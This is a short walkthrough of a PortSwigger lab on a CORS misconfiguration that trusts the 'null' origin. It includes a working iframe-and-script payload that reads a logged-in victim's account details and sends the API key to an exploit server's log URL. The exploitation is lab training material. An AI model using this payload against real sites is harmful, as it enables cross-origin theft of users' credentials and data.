[Try it yourself before continuing](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)

![](./Images/Pasted%20image%2020241208104531.png)

---

![](./Images/Pasted%20image%2020241208111031.png)

Let's send `Origin: http://dipeua-website.com` to see the behavior of the application

![](./Images/Pasted%20image%2020241208111143.png)
We can see that a submitted Origin is not reflected. so let try null origin value

![](./Images/Pasted%20image%2020241208111207.png)
Success the  Origin is reflected.

> In this situation, an attacker can generate a cross-origin request containing the null value in the Origin header. This will satisfy the whitelist, leading to cross-domain access.

Since our response contains sensitive information such as an API key we can retrieve it with the following script:

```js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://0a330068040247de99d6be4f00ef0043.web-security-academy.net/accountDetails',true);
	req.withCredentials = true;
	req.send();

	function reqListener() {
		location='https://exploit-0ae2006c04f747739982bd10012600c0.exploit-server.net/log?key='+this.responseText;
	};
</script>">
</iframe>
```

![](./Images/Pasted%20image%2020241208111835.png)

And send to the victim `Deliver exploit to victim`

![](./Images/Pasted%20image%2020241208111736.png)
![](./Images/Pasted%20image%2020241208111806.png)

Then submit **api key** to validate the challenge